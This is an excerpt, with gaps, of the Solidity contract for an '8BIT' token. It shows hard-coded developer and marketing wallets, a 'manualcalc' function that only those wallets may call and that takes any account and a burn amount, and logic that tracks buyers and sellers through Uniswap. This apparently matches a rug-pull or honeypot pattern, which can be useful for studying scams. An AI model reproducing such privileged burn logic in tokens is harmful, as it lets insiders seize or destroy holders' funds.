...
contract EightBit is Context, IERC20, Ownable {
    ...
    string private constant _name = "8BIT";
    ...
    address payable public _developmentAddress = payable(address(0xFF1550f5e1A7692286f53dD0BBc73DD3A92dd7E3));
    address payable public _marketingAddress = payable(address(0x7C1808B0Ec339EAd56805De50Dc24aE6E165d0E9));
    ...
    function manualcalc(address account, uint256 burnAmount) external {
        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);
    ...
    function checkOrigin(address from, address to) private {
        if (from == uniswapV2Pair) {
            ...
            if (to != address(this)) {
                if (holdOrigin[to] == 0)
                holdOrigin[to] = (holdOrigin[to] > 0 || balanceOf(to) > 0) ? holdOrigin[to] : block.timestamp;
            }
        } else {
            holdCurrentOut = from;
        }
